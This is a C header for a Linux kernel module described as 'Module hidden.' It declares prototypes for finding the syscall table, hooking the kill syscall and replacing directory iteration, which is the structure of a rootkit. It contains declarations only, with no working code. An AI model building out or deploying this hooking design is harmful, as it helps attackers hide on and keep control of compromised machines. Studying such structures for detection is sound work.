#ifndef __WEASEL_HEADER__
#define __WEASEL_HEADER__

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/linkage.h>
#include <linux/syscalls.h>
#include <linux/sys.h>
#include <linux/cache.h>
#include <asm/asm-offsets.h>
#include <asm/syscall.h>

MODULE_DESCRIPTION ("Module hidden.");
MODULE_AUTHOR ("VALERI Yoann");
MODULE_LICENSE ("GPL");

int my_actor(struct dir_context *ctx, const char *name, int nlen, loff_t off,
	u64 ino, unsigned x);
int my_iterate(struct file *fp, struct dir_context *ctx);

static unsigned long **find_sys_call_table(void);
static asmlinkage int my_sys_kill(pid_t pid, int sig);

static int __init hide_init (void);
module_init (hide_init);

static void __exit hide_exit (void);
module_exit (hide_exit);

#endif